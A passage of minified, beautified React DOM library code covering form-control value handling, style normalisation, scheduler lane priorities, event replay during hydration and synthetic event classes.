    ("number" !== t || Yo(e.ownerDocument) !== e) && (null == n ? e.defaultValue = "" + e._wrapperState.initialValue : e.defaultValue !== "" + n && (e.defaultValue = "" + n));
}
var cr = Array.isArray;
function Nn(e, t, n, r) {
    if (e = e.options, t) {
        t = {};
        for (var o = 0; o < n.length; o++) t["$" + n[o]] = !0;
        for (n = 0; n < e.length; n++) o = t.hasOwnProperty("$" + e[n].value), e[n].selected !== o && (e[n].selected = o), o && r && (e[n].defaultSelected = !0);
    } else {
        for (n = "" + Lt(n), t = null, o = 0; o < e.length; o++) {
            if (e[o].value === n) return e[o].selected = !0, void (r && (e[o].defaultSelected = !0));
            null !== t || e[o].disabled || (t = e[o]);
        }
        null !== t && (t.selected = !0);
    }
}
function Ai(e, t) {
    if (null != t.dangerouslySetInnerHTML) throw Error(_(91));
    return Q({}, t, {
        value: void 0,
        defaultValue: void 0,
        children: "" + e._wrapperState.initialValue
    });
}
function Bu(e, t) {
    var n = t.value;
    if (null == n) {
        if (n = t.children, t = t.defaultValue, null != n) {
            if (null != t) throw Error(_(92));
            if (cr(n)) {
                if (1 < n.length) throw Error(_(93));
                n = n[0];
            }
            t = n;
        }
        null == t && (t = ""), n = t;
    }
    e._wrapperState = {
        initialValue: Lt(n)
    };
}
function Tc(e, t) {
    var n = Lt(t.value),
        r = Lt(t.defaultValue);
    null != n && ((n = "" + n) !== e.value && (e.value = n), null == t.defaultValue && e.defaultValue !== n && (e.defaultValue = n)), null != r && (e.defaultValue = "" + r);
}
function Hu(e) {
    var t = e.textContent;
    t === e._wrapperState.initialValue && "" !== t && null !== t && (e.value = t);
}
function Ic(e) {
    switch (e) {
        case "svg":
            return "http://www.w3.org/2000/svg";
        case "math":
            return "http://www.w3.org/1998/Math/MathML";
        default:
            return "http://www.w3.org/1999/xhtml";
    }
}
function $i(e, t) {
    return null == e || "http://www.w3.org/1999/xhtml" === e ? Ic(t) : "http://www.w3.org/2000/svg" === e && "foreignObject" === t ? "http://www.w3.org/1999/xhtml" : e;
}
var ao,
    zc = function (e) {
        return typeof MSApp < "u" && MSApp.execUnsafeLocalFunction ? function (t, n, r, o) {
            MSApp.execUnsafeLocalFunction(function () {
                return e(t, n);
            });
        } : e;
    }(function (e, t) {
        if ("http://www.w3.org/2000/svg" !== e.namespaceURI || "innerHTML" in e) e.innerHTML = t; else {
            for ((ao = ao || document.createElement("div")).innerHTML = "<svg>" + t.valueOf().toString() + "</svg>", t = ao.firstChild; e.firstChild;) e.removeChild(e.firstChild);
            for (; t.firstChild;) e.appendChild(t.firstChild);
        }
    });
function _r(e, t) {
    if (t) {
        var n = e.firstChild;
        if (n && n === e.lastChild && 3 === n.nodeType) return void (n.nodeValue = t);
    }
    e.textContent = t;
}
var pr = {
    animationIterationCount: !0,
    aspectRatio: !0,
    borderImageOutset: !0,
    borderImageSlice: !0,
    borderImageWidth: !0,
    boxFlex: !0,
    boxFlexGroup: !0,
    boxOrdinalGroup: !0,
    columnCount: !0,
    columns: !0,
    flex: !0,
    flexGrow: !0,
    flexPositive: !0,
    flexShrink: !0,
    flexNegative: !0,
    flexOrder: !0,
    gridArea: !0,
    gridRow: !0,
    gridRowEnd: !0,
    gridRowSpan: !0,
    gridRowStart: !0,
    gridColumn: !0,
    gridColumnEnd: !0,
    gridColumnSpan: !0,
    gridColumnStart: !0,
    fontWeight: !0,
    lineClamp: !0,
    lineHeight: !0,
    opacity: !0,
    order: !0,
    orphans: !0,
    tabSize: !0,
    widows: !0,
    zIndex: !0,
    zoom: !0,
    fillOpacity: !0,
    floodOpacity: !0,
    stopOpacity: !0,
    strokeDasharray: !0,
    strokeDashoffset: !0,
    strokeMiterlimit: !0,
    strokeOpacity: !0,
    strokeWidth: !0
},
    am = ["Webkit", "ms", "Moz", "O"];
function Rc(e, t, n) {
    return null == t || "boolean" == typeof t || "" === t ? "" : n || "number" != typeof t || 0 === t || pr.hasOwnProperty(e) && pr[e] ? ("" + t).trim() : t + "px";
}
function Oc(e, t) {
    for (var n in e = e.style, t) if (t.hasOwnProperty(n)) {
        var r = 0 === n.indexOf("--"),
            o = Rc(n, t[n], r);
        "float" === n && (n = "cssFloat"), r ? e.setProperty(n, o) : e[n] = o;
    }
}
Object.keys(pr).forEach(function (e) {
    am.forEach(function (t) {
        t = t + e.charAt(0).toUpperCase() + e.substring(1), pr[t] = pr[e];
    });
});
var cm = Q({
    menuitem: !0
}, {
    area: !0,
    base: !0,
    br: !0,
    col: !0,
    embed: !0,
    hr: !0,
    img: !0,
    input: !0,
    keygen: !0,
    link: !0,
    meta: !0,
    param: !0,
    source: !0,
    track: !0,
    wbr: !0
});
function Fi(e, t) {
    if (t) {
        if (cm[e] && (null != t.children || null != t.dangerouslySetInnerHTML)) throw Error(_(137, e));
        if (null != t.dangerouslySetInnerHTML) {
            if (null != t.children) throw Error(_(60));
            if ("object" != typeof t.dangerouslySetInnerHTML || !("__html" in t.dangerouslySetInnerHTML)) throw Error(_(61));
        }
        if (null != t.style && "object" != typeof t.style) throw Error(_(62));
    }
}
function Di(e, t) {
    if (-1 === e.indexOf("-")) return "string" == typeof t.is;
    switch (e) {
        case "annotation-xml":
        case "color-profile":
        case "font-face":
        case "font-face-src":
        case "font-face-uri":
        case "font-face-format":
        case "font-face-name":
        case "missing-glyph":
            return !1;
        default:
            return !0;
    }
}
var Ui = null;
function Ws(e) {
    return (e = e.target || e.srcElement || window).correspondingUseElement && (e = e.correspondingUseElement), 3 === e.nodeType ? e.parentNode : e;
}
var bi = null,
    Pn = null,
    jn = null;
function Ku(e) {
    if (e = Gr(e)) {
        if ("function" != typeof bi) throw Error(_(280));
        var t = e.stateNode;
        t && (t = Il(t), bi(e.stateNode, e.type, t));
    }
}
function Mc(e) {
    Pn ? jn ? jn.push(e) : jn = [e] : Pn = e;
}
function Lc() {
    if (Pn) {
        var e = Pn,
            t = jn;
        if (jn = Pn = null, Ku(e), t) for (e = 0; e < t.length; e++) Ku(t[e]);
    }
}
function Ac(e, t) {
    return e(t);
}
function $c() { }
var ei = !1;
function Fc(e, t, n) {
    if (ei) return e(t, n);
    ei = !0;
    try {
        return Ac(e, t, n);
    } finally {
        ei = !1, (null !== Pn || null !== jn) && ($c(), Lc());
    }
}
function Cr(e, t) {
    var n = e.stateNode;
    if (null === n) return null;
    var r = Il(n);
    if (null === r) return null;
    n = r[t];
    e: switch (t) {
        case "onClick":
        case "onClickCapture":
        case "onDoubleClick":
        case "onDoubleClickCapture":
        case "onMouseDown":
        case "onMouseDownCapture":
        case "onMouseMove":
        case "onMouseMoveCapture":
        case "onMouseUp":
        case "onMouseUpCapture":
        case "onMouseEnter":
            (r = !r.disabled) || (r = !("button" === (e = e.type) || "input" === e || "select" === e || "textarea" === e)), e = !r;
            break e;
        default:
            e = !1;
    }
    if (e) return null;
    if (n && "function" != typeof n) throw Error(_(231, t, typeof n));
    return n;
}
var Vi = !1;
if (ct) try {
    var er = {};
    Object.defineProperty(er, "passive", {
        get: function () {
            Vi = !0;
        }
    }), window.addEventListener("test", er, er), window.removeEventListener("test", er, er);
} catch {
    Vi = !1;
}
function dm(e, t, n, r, o, l, i, s, a) {
    var u = Array.prototype.slice.call(arguments, 3);
    try {
        t.apply(n, u);
    } catch (d) {
        this.onError(d);
    }
}
var mr = !1,
    Xo = null,
    Jo = !1,
    Wi = null,
    fm = {
        onError: function (e) {
            mr = !0, Xo = e;
        }
    };
function pm(e, t, n, r, o, l, i, s, a) {
    mr = !1, Xo = null, dm.apply(fm, arguments);
}
function mm(e, t, n, r, o, l, i, s, a) {
    if (pm.apply(this, arguments), mr) {
        if (!mr) throw Error(_(198));
        var u = Xo;
        mr = !1, Xo = null, Jo || (Jo = !0, Wi = u);
    }
}
function sn(e) {
    var t = e,
        n = e;
    if (e.alternate) for (; t.return;) t = t.return; else {
        e = t;
        do {
            4098 & (t = e).flags && (n = t.return), e = t.return;
        } while (e);
    }
    return 3 === t.tag ? n : null;
}
function Dc(e) {
    if (13 === e.tag) {
        var t = e.memoizedState;
        if (null === t && null !== (e = e.alternate) && (t = e.memoizedState), null !== t) return t.dehydrated;
    }
    return null;
}
function Gu(e) {
    if (sn(e) !== e) throw Error(_(188));
}
function hm(e) {
    var t = e.alternate;
    if (!t) {
        if (null === (t = sn(e))) throw Error(_(188));
        return t !== e ? null : e;
    }
    for (var n = e, r = t; ;) {
        var o = n.return;
        if (null === o) break;
        var l = o.alternate;
        if (null === l) {
            if (null !== (r = o.return)) {
                n = r;
                continue;
            }
            break;
        }
        if (o.child === l.child) {
            for (l = o.child; l;) {
                if (l === n) return Gu(o), e;
                if (l === r) return Gu(o), t;
                l = l.sibling;
            }
            throw Error(_(188));
        }
        if (n.return !== r.return) n = o, r = l; else {
            for (var i = !1, s = o.child; s;) {
                if (s === n) {
                    i = !0, n = o, r = l;
                    break;
                }
                if (s === r) {
                    i = !0, r = o, n = l;
                    break;
                }
                s = s.sibling;
            }
            if (!i) {
                for (s = l.child; s;) {
                    if (s === n) {
                        i = !0, n = l, r = o;
                        break;
                    }
                    if (s === r) {
                        i = !0, r = l, n = o;
                        break;
                    }
                    s = s.sibling;
                }
                if (!i) throw Error(_(189));
            }
        }
        if (n.alternate !== r) throw Error(_(190));
    }
    if (3 !== n.tag) throw Error(_(188));
    return n.stateNode.current === n ? e : t;
}
function Uc(e) {
    return null !== (e = hm(e)) ? bc(e) : null;
}
function bc(e) {
    if (5 === e.tag || 6 === e.tag) return e;
    for (e = e.child; null !== e;) {
        var t = bc(e);
        if (null !== t) return t;
        e = e.sibling;
    }
    return null;
}
var Vc = Ne.unstable_scheduleCallback,
    Qu = Ne.unstable_cancelCallback,
    vm = Ne.unstable_shouldYield,
    gm = Ne.unstable_requestPaint,
    X = Ne.unstable_now,
    ym = Ne.unstable_getCurrentPriorityLevel,
    Bs = Ne.unstable_ImmediatePriority,
    Wc = Ne.unstable_UserBlockingPriority,
    Zo = Ne.unstable_NormalPriority,
    wm = Ne.unstable_LowPriority,
    Bc = Ne.unstable_IdlePriority,
    Nl = null,
    qe = null;
function xm(e) {
    if (qe && "function" == typeof qe.onCommitFiberRoot) try {
        qe.onCommitFiberRoot(Nl, e, void 0, !(128 & ~e.current.flags));
    } catch { }
}
var Ve = Math.clz32 ? Math.clz32 : _m,
    Sm = Math.log,
    km = Math.LN2;
function _m(e) {
    return 0 === (e >>>= 0) ? 32 : 31 - (Sm(e) / km | 0) | 0;
}
var co = 64,
    fo = 4194304;
function dr(e) {
    switch (e & -e) {
        case 1:
            return 1;
        case 2:
            return 2;
        case 4:
            return 4;
        case 8:
            return 8;
        case 16:
            return 16;
        case 32:
            return 32;
        case 64:
        case 128:
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
            return 4194240 & e;
        case 4194304:
        case 8388608:
        case 16777216:
        case 33554432:
        case 67108864:
            return 130023424 & e;
        case 134217728:
            return 134217728;
        case 268435456:
            return 268435456;
        case 536870912:
            return 536870912;
        case 1073741824:
            return 1073741824;
        default:
            return e;
    }
}
function qo(e, t) {
    var n = e.pendingLanes;
    if (0 === n) return 0;
    var r = 0,
        o = e.suspendedLanes,
        l = e.pingedLanes,
        i = 268435455 & n;
    if (0 !== i) {
        var s = i & ~o;
        0 !== s ? r = dr(s) : 0 !== (l &= i) && (r = dr(l));
    } else 0 !== (i = n & ~o) ? r = dr(i) : 0 !== l && (r = dr(l));
    if (0 === r) return 0;
    if (0 !== t && t !== r && !(t & o) && ((o = r & -r) >= (l = t & -t) || 16 === o && 4194240 & l)) return t;
    if (4 & r && (r |= 16 & n), 0 !== (t = e.entangledLanes)) for (e = e.entanglements, t &= r; 0 < t;) o = 1 << (n = 31 - Ve(t)), r |= e[n], t &= ~o;
    return r;
}
function Cm(e, t) {
    switch (e) {
        case 1:
        case 2:
        case 4:
            return t + 250;
        case 8:
        case 16:
        case 32:
        case 64:
        case 128:
        case 256:
        case 512:
        case 1024:
        case 2048:
        case 4096:
        case 8192:
        case 16384:
        case 32768:
        case 65536:
        case 131072:
        case 262144:
        case 524288:
        case 1048576:
        case 2097152:
            return t + 5e3;
        default:
            return -1;
    }
}
function Em(e, t) {
    for (var n = e.suspendedLanes, r = e.pingedLanes, o = e.expirationTimes, l = e.pendingLanes; 0 < l;) {
        var i = 31 - Ve(l),
            s = 1 << i,
            a = o[i];
        -1 === a ? (!(s & n) || s & r) && (o[i] = Cm(s, t)) : a <= t && (e.expiredLanes |= s), l &= ~s;
    }
}
function Bi(e) {
    return 0 !== (e = -1073741825 & e.pendingLanes) ? e : 1073741824 & e ? 1073741824 : 0;
}
function Hc() {
    var e = co;
    return !(4194240 & (co <<= 1)) && (co = 64), e;
}
function ti(e) {
    for (var t = [], n = 0; 31 > n; n++) t.push(e);
    return t;
}
function Hr(e, t, n) {
    e.pendingLanes |= t, 536870912 !== t && (e.suspendedLanes = 0, e.pingedLanes = 0), (e = e.eventTimes)[t = 31 - Ve(t)] = n;
}
function Nm(e, t) {
    var n = e.pendingLanes & ~t;
    e.pendingLanes = t, e.suspendedLanes = 0, e.pingedLanes = 0, e.expiredLanes &= t, e.mutableReadLanes &= t, e.entangledLanes &= t, t = e.entanglements;
    var r = e.eventTimes;
    for (e = e.expirationTimes; 0 < n;) {
        var o = 31 - Ve(n),
            l = 1 << o;
        t[o] = 0, r[o] = -1, e[o] = -1, n &= ~l;
    }
}
function Hs(e, t) {
    var n = e.entangledLanes |= t;
    for (e = e.entanglements; n;) {
        var r = 31 - Ve(n),
            o = 1 << r;
        o & t | e[r] & t && (e[r] |= t), n &= ~o;
    }
}
var $ = 0;
function Kc(e) {
    return 1 < (e &= -e) ? 4 < e ? 268435455 & e ? 16 : 536870912 : 4 : 1;
}
var Gc,
    Ks,
    Qc,
    Yc,
    Xc,
    Hi = !1,
    po = [],
    Pt = null,
    jt = null,
    Tt = null,
    Er = new Map(),
    Nr = new Map(),
    kt = [],
    Pm = "mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");
function Yu(e, t) {
    switch (e) {
        case "focusin":
        case "focusout":
            Pt = null;
            break;
        case "dragenter":
        case "dragleave":
            jt = null;
            break;
        case "mouseover":
        case "mouseout":
            Tt = null;
            break;
        case "pointerover":
        case "pointerout":
            Er.delete(t.pointerId);
            break;
        case "gotpointercapture":
        case "lostpointercapture":
            Nr.delete(t.pointerId);
    }
}
function tr(e, t, n, r, o, l) {
    return null === e || e.nativeEvent !== l ? (e = {
        blockedOn: t,
        domEventName: n,
        eventSystemFlags: r,
        nativeEvent: l,
        targetContainers: [o]
    }, null !== t && null !== (t = Gr(t)) && Ks(t), e) : (e.eventSystemFlags |= r, t = e.targetContainers, null !== o && -1 === t.indexOf(o) && t.push(o), e);
}
function jm(e, t, n, r, o) {
    switch (t) {
        case "focusin":
            return Pt = tr(Pt, e, t, n, r, o), !0;
        case "dragenter":
            return jt = tr(jt, e, t, n, r, o), !0;
        case "mouseover":
            return Tt = tr(Tt, e, t, n, r, o), !0;
        case "pointerover":
            var l = o.pointerId;
            return Er.set(l, tr(Er.get(l) || null, e, t, n, r, o)), !0;
        case "gotpointercapture":
            return l = o.pointerId, Nr.set(l, tr(Nr.get(l) || null, e, t, n, r, o)), !0;
    }
    return !1;
}
function Jc(e) {
    var t = Kt(e.target);
    if (null !== t) {
        var n = sn(t);
        if (null !== n) if (13 === (t = n.tag)) {
            if (null !== (t = Dc(n))) return e.blockedOn = t, void Xc(e.priority, function () {
                Qc(n);
            });
        } else if (3 === t && n.stateNode.current.memoizedState.isDehydrated) return void (e.blockedOn = 3 === n.tag ? n.stateNode.containerInfo : null);
    }
    e.blockedOn = null;
}
function Lo(e) {
    if (null !== e.blockedOn) return !1;
    for (var t = e.targetContainers; 0 < t.length;) {
        var n = Ki(e.domEventName, e.eventSystemFlags, t[0], e.nativeEvent);
        if (null !== n) return null !== (t = Gr(n)) && Ks(t), e.blockedOn = n, !1;
        var r = new (n = e.nativeEvent).constructor(n.type, n);
        Ui = r, n.target.dispatchEvent(r), Ui = null, t.shift();
    }
    return !0;
}
function Xu(e, t, n) {
    Lo(e) && n.delete(t);
}
function Tm() {
    Hi = !1, null !== Pt && Lo(Pt) && (Pt = null), null !== jt && Lo(jt) && (jt = null), null !== Tt && Lo(Tt) && (Tt = null), Er.forEach(Xu), Nr.forEach(Xu);
}
function nr(e, t) {
    e.blockedOn === t && (e.blockedOn = null, Hi || (Hi = !0, Ne.unstable_scheduleCallback(Ne.unstable_NormalPriority, Tm)));
}
function Pr(e) {
    function t(o) {
        return nr(o, e);
    }
    if (0 < po.length) {
        nr(po[0], e);
        for (var n = 1; n < po.length; n++) {
            var r = po[n];
            r.blockedOn === e && (r.blockedOn = null);
        }
    }
    for (null !== Pt && nr(Pt, e), null !== jt && nr(jt, e), null !== Tt && nr(Tt, e), Er.forEach(t), Nr.forEach(t), n = 0; n < kt.length; n++) (r = kt[n]).blockedOn === e && (r.blockedOn = null);
    for (; 0 < kt.length && null === (n = kt[0]).blockedOn;) Jc(n), null === n.blockedOn && kt.shift();
}
var Tn = ht.ReactCurrentBatchConfig,
    el = !0;
function Im(e, t, n, r) {
    var o = $,
        l = Tn.transition;
    Tn.transition = null;
    try {
        $ = 1, Gs(e, t, n, r);
    } finally {
        $ = o, Tn.transition = l;
    }
}
function zm(e, t, n, r) {
    var o = $,
        l = Tn.transition;
    Tn.transition = null;
    try {
        $ = 4, Gs(e, t, n, r);
    } finally {
        $ = o, Tn.transition = l;
    }
}
function Gs(e, t, n, r) {
    if (el) {
        var o = Ki(e, t, n, r);
        if (null === o) di(e, t, r, tl, n), Yu(e, r); else if (jm(o, e, t, n, r)) r.stopPropagation(); else if (Yu(e, r), 4 & t && -1 < Pm.indexOf(e)) {
            for (; null !== o;) {
                var l = Gr(o);
                if (null !== l && Gc(l), null === (l = Ki(e, t, n, r)) && di(e, t, r, tl, n), l === o) break;
                o = l;
            }
            null !== o && r.stopPropagation();
        } else di(e, t, r, null, n);
    }
}
var tl = null;
function Ki(e, t, n, r) {
    if (tl = null, null !== (e = Kt(e = Ws(r)))) if (null === (t = sn(e))) e = null; else if (13 === (n = t.tag)) {
        if (null !== (e = Dc(t))) return e;
        e = null;
    } else if (3 === n) {
        if (t.stateNode.current.memoizedState.isDehydrated) return 3 === t.tag ? t.stateNode.containerInfo : null;
        e = null;
    } else t !== e && (e = null);
    return tl = e, null;
}
function Zc(e) {
    switch (e) {
        case "cancel":
        case "click":
        case "close":
        case "contextmenu":
        case "copy":
        case "cut":
        case "auxclick":
        case "dblclick":
        case "dragend":
        case "dragstart":
        case "drop":
        case "focusin":
        case "focusout":
        case "input":
        case "invalid":
        case "keydown":
        case "keypress":
        case "keyup":
        case "mousedown":
        case "mouseup":
        case "paste":
        case "pause":
        case "play":
        case "pointercancel":
        case "pointerdown":
        case "pointerup":
        case "ratechange":
        case "reset":
        case "resize":
        case "seeked":
        case "submit":
        case "touchcancel":
        case "touchend":
        case "touchstart":
        case "volumechange":
        case "change":
        case "selectionchange":
        case "textInput":
        case "compositionstart":
        case "compositionend":
        case "compositionupdate":
        case "beforeblur":
        case "afterblur":
        case "beforeinput":
        case "blur":
        case "fullscreenchange":
        case "focus":
        case "hashchange":
        case "popstate":
        case "select":
        case "selectstart":
            return 1;
        case "drag":
        case "dragenter":
        case "dragexit":
        case "dragleave":
        case "dragover":
        case "mousemove":
        case "mouseout":
        case "mouseover":
        case "pointermove":
        case "pointerout":
        case "pointerover":
        case "scroll":
        case "toggle":
        case "touchmove":
        case "wheel":
        case "mouseenter":
        case "mouseleave":
        case "pointerenter":
        case "pointerleave":
            return 4;
        case "message":
            switch (ym()) {
                case Bs:
                    return 1;
                case Wc:
                    return 4;
                case Zo:
                case wm:
                    return 16;
                case Bc:
                    return 536870912;
                default:
                    return 16;
            }
        default:
            return 16;
    }
}
var Et = null,
    Qs = null,
    Ao = null;
function qc() {
    if (Ao) return Ao;
    var e,
        r,
        t = Qs,
        n = t.length,
        o = "value" in Et ? Et.value : Et.textContent,
        l = o.length;
    for (e = 0; e < n && t[e] === o[e]; e++);
    var i = n - e;
    for (r = 1; r <= i && t[n - r] === o[l - r]; r++);
    return Ao = o.slice(e, 1 < r ? 1 - r : void 0);
}
function $o(e) {
    var t = e.keyCode;
    return "charCode" in e ? 0 === (e = e.charCode) && 13 === t && (e = 13) : e = t, 10 === e && (e = 13), 32 <= e || 13 === e ? e : 0;
}
function mo() {
    return !0;
}
function Ju() {
    return !1;
}
function Ie(e) {
    function t(n, r, o, l, i) {
        for (var s in this._reactName = n, this._targetInst = o, this.type = r, this.nativeEvent = l, this.target = i, this.currentTarget = null, e) e.hasOwnProperty(s) && (n = e[s], this[s] = n ? n(l) : l[s]);
        return this.isDefaultPrevented = (null != l.defaultPrevented ? l.defaultPrevented : !1 === l.returnValue) ? mo : Ju, this.isPropagationStopped = Ju, this;
    }
    return Q(t.prototype, {
        preventDefault: function () {
            this.defaultPrevented = !0;
            var n = this.nativeEvent;
            n && (n.preventDefault ? n.preventDefault() : "unknown" != typeof n.returnValue && (n.returnValue = !1), this.isDefaultPrevented = mo);
        },
        stopPropagation: function () {
            var n = this.nativeEvent;
            n && (n.stopPropagation ? n.stopPropagation() : "unknown" != typeof n.cancelBubble && (n.cancelBubble = !0), this.isPropagationStopped = mo);
        },
        persist: function () { },
        isPersistent: mo
    }), t;
}
var ni,
    ri,
    rr,
    Wn = {
        eventPhase: 0,
        bubbles: 0,
        cancelable: 0,
        timeStamp: function (e) {
            return e.timeStamp || Date.now();
        },
        defaultPrevented: 0,
        isTrusted: 0
    },
    Ys = Ie(Wn),
    Kr = Q({}, Wn, {
        view: 0,
        detail: 0
    }),
    Rm = Ie(Kr),
    Pl = Q({}, Kr, {
        screenX: 0,
        screenY: 0,
        clientX: 0,
        clientY: 0,
        pageX: 0,
        pageY: 0,
        ctrlKey: 0,
        shiftKey: 0,
        altKey: 0,
        metaKey: 0,
        getModifierState: Xs,
        button: 0,
        buttons: 0,
        relatedTarget: function (e) {
            return void 0 === e.relatedTarget ? e.fromElement === e.srcElement ? e.toElement : e.fromElement : e.relatedTarget;
        },
        movementX: function (e) {
            return "movementX" in e ? e.movementX : (e !== rr && (rr && "mousemove" === e.type ? (ni = e.screenX - rr.screenX, ri = e.screenY - rr.screenY) : ri = ni = 0, rr = e), ni);
        },
        movementY: function (e) {
            return "movementY" in e ? e.movementY : ri;
        }
    }),
    Zu = Ie(Pl),
    Om = Q({}, Pl, {
        dataTransfer: 0
    }),
    Mm = Ie(Om),
    Lm = Q({}, Kr, {
        relatedTarget: 0
    }),
    oi = Ie(Lm),
    Am = Q({}, Wn, {
        animationName: 0,
        elapsedTime: 0,
        pseudoElement: 0
    }),
    $m = Ie(Am),
    Fm = Q({}, Wn, {
        clipboardData: function (e) {
            return "clipboardData" in e ? e.clipboardData : window.clipboardData;
        }
    }),
    Dm = Ie(Fm),
    Um = Q({}, Wn, {
        data: 0
    }),
    qu = Ie(Um),
    bm = {
        Esc: "Escape",
        Spacebar: " ",
        Left: "ArrowLeft",
        Up: "ArrowUp",
        Right: "ArrowRight",
        Down: "ArrowDown",
        Del: "Delete",
        Win: "OS",
        Menu: "ContextMenu",
        Apps: "ContextMenu",
        Scroll: "ScrollLock",
        MozPrintableKey: "Unidentified"
    },
    Vm = {
        8: "Backspace",
        9: "Tab",
        12: "Clear",
        13: "Enter",
        16: "Shift",
        17: "Control",
        18: "Alt",
        19: "Pause",
        20: "CapsLock",
        27: "Escape",
        32: " ",
        33: "PageUp",
        34: "PageDown",
        35: "End",
        36: "Home",
        37: "ArrowLeft",
        38: "ArrowUp",
        39: "ArrowRight",
        40: "ArrowDown",
        45: "Insert",
        46: "Delete",
        112: "F1",
        113: "F2",
        114: "F3",
        115: "F4",
        116: "F5",
        117: "F6",
        118: "F7",
        119: "F8",
        120: "F9",
        121: "F10",
        122: "F11",
        123: "F12",
        144: "NumLock",
        145: "ScrollLock",
        224: "Meta"
    },
    Wm = {
        Alt: "altKey",
        Control: "ctrlKey",
        Meta: "metaKey",
        Shift: "shiftKey"
    };
function Bm(e) {
    var t = this.nativeEvent;
    return t.getModifierState ? t.getModifierState(e) : !!(e = Wm[e]) && !!t[e];
}
function Xs() {
    return Bm;
}
var Hm = Q({}, Kr, {
    key: function (e) {
        if (e.key) {
            var t = bm[e.key] || e.key;
            if ("Unidentified" !== t) return t;
        }
        return "keypress" === e.type ? 13 === (e = $o(e)) ? "Enter" : String.fromCharCode(e) : "keydown" === e.type || "keyup" === e.type ? Vm[e.keyCode] || "Unidentified" : "";
    },
    code: 0,
    location: 0,
    ctrlKey: 0,
    shiftKey: 0,
    altKey: 0,
    metaKey: 0,
    repeat: 0,
    locale: 0,
    getModifierState: Xs,
    charCode: function (e) {
        return "keypress" === e.type ? $o(e) : 0;
    },
    keyCode: function (e) {
        return "keydown" === e.type || "keyup" === e.type ? e.keyCode : 0;
    },
    which: function (e) {
        return "keypress" === e.type ? $o(e) : "keydown" === e.type || "keyup" === e.type ? e.keyCode : 0;
    }
}),
    Km = Ie(Hm),
    Gm = Q({}, Pl, {
        pointerId: 0,
        width: 0,
        height: 0,
        pressure: 0,
        tangentialPressure: 0,
        tiltX: 0,
        tiltY: 0,
        twist: 0,
        pointerType: 0,
        isPrimary: 0
    }),
    ea = Ie(Gm),
    Qm = Q({}, Kr, {
        touches: 0,
        targetTouches: 0,
        changedTouches: 0,
        altKey: 0,
        metaKey: 0,
        ctrlKey: 0,
        shiftKey: 0,
        getModifierState: Xs
    }),
    Ym = Ie(Qm),
    Xm = Q({}, Wn, {
        propertyName: 0,
        elapsedTime: 0,
        pseudoElement: 0
    }),
    Jm = Ie(Xm),
    Zm = Q({}, Pl, {
        deltaX: function (e) {
            return "deltaX" in e ? e.deltaX : "wheelDeltaX" in e ? -e.wheelDeltaX : 0;
        },
        deltaY: function (e) {
            return "deltaY" in e ? e.deltaY : "wheelDeltaY" in e ? -e.wheelDeltaY : "wheelDelta" in e ? -e.wheelDelta : 0;
        },
        deltaZ: 0,
        deltaMode: 0
    }),
    qm = Ie(Zm),
    eh = [9, 13, 27, 32],
    Js = ct && "CompositionEvent" in window,
    hr = null;
ct && "documentMode" in document && (hr = document.documentMode);
var th = ct && "TextEvent" in window && !hr,
    ed = ct && (!Js || hr && 8 < hr && 11 >= hr),
    ta = " ",
    na = !1;
function td(e, t) {
    switch (e) {
        case "keyup":
            return -1 !== eh.indexOf(t.keyCode);
        case "keydown":
            return 229 !== t.keyCode;
        case "keypress":
        case "mousedown":
        case "focusout":
            return !0;
        default:
            return !1;
    }
}
function nd(e) {
    return "object" == typeof (e = e.detail) && "data" in e ? e.data : null;
}
var vn = !1;
function nh(e, t) {
    switch (e) {
        case "compositionend":
            return nd(t);
        case "keypress":
            return 32 !== t.which ? null : (na = !0, ta);
        case "textInput":
            return (e = t.data) === ta && na ? null : e;
        default:
            return null;
    }
}
function rh(e, t) {
    if (vn) return "compositionend" === e || !Js && td(e, t) ? (e = qc(), Ao = Qs = Et = null, vn = !1, e) : null;
    switch (e) {
        case "paste":
        default:
            return null;
        case "keypress":
            if (!(t.ctrlKey || t.altKey || t.metaKey) || t.ctrlKey && t.altKey) {
                if (t.char && 1 < t.char.length) return t.char;
                if (t.which) return String.fromCharCode(t.which);
            }
            return null;
        case "compositionend":
            return ed && "ko" !== t.locale ? null : t.data;
    }
}
var oh = {
    color: !0,
    date: !0,
    datetime: !0,
    "datetime-local": !0,
    email: !0,
    month: !0,
    number: !0,
    password: !0,
    range: !0,
    search: !0,
    tel: !0,
    text: !0,
    time: !0,
    url: !0,
    week: !0
};
function ra(e) {
    var t = e && e.nodeName && e.nodeName.toLowerCase();
    return "input" === t ? !!oh[e.type] : "textarea" === t;
}
function rd(e, t, n, r) {
    Mc(r), 0 < (t = nl(t, "onChange")).length && (n = new Ys("onChange", "change", null, n, r), e.push({
        event: n,
        listeners: t
    }));
}
var vr = null,
    jr = null;
function lh(e) {
    md(e, 0);
}
function jl(e) {
    if (Pc(wn(e))) return e;
}
function ih(e, t) {
    if ("change" === e) return t;
}
var od = !1;
if (ct) {
    var li;
    if (ct) {
        var ii = "oninput" in document;
        if (!ii) {
            var oa = document.createElement("div");
            oa.setAttribute("oninput", "return;"), ii = "function" == typeof oa.oninput;
        }
        li = ii;
    } else li = !1;
    od = li && (!document.documentMode || 9 < document.documentMode);
}
function la() {
    vr && (vr.detachEvent("onpropertychange", ld), jr = vr = null);
}
function ld(e) {
    if ("value" === e.propertyName && jl(jr)) {
        var t = [];
        rd(t, jr, e, Ws(e)), Fc(lh, t);
    }
}
function sh(e, t, n) {
    "focusin" === e ? (la(), jr = n, (vr = t).attachEvent("onpropertychange", ld)) : "focusout" === e && la();
}
function uh(e) {
    if ("selectionchange" === e || "keyup" === e || "keydown" === e) return jl(jr);
}
function ah(e, t) {
    if ("click" === e) return jl(t);
}
function ch(e, t) {
    if ("input" === e || "change" === e) return jl(t);
}
function dh(e, t) {
    return e === t && (0 !== e || 1 / e == 1 / t) || e != e && t != t;
}
var Be = "function" == typeof Object.is ? Object.is : dh;
function Tr(e, t) {
    if (Be(e, t)) return !0;
    if ("object" != typeof e || null === e || "object" != typeof t || null === t) return !1;
    var n = Object.keys(e),
        r = Object.keys(t);
    if (n.length !== r.length) return !1;
    for (r = 0; r < n.length; r++) {
        var o = n[r];
        if (!ji.call(t, o) || !Be(e[o], t[o])) return !1;
    }
    return !0;
}
function ia(e) {
    for (; e && e.firstChild;) e = e.firstChild;
    return e;
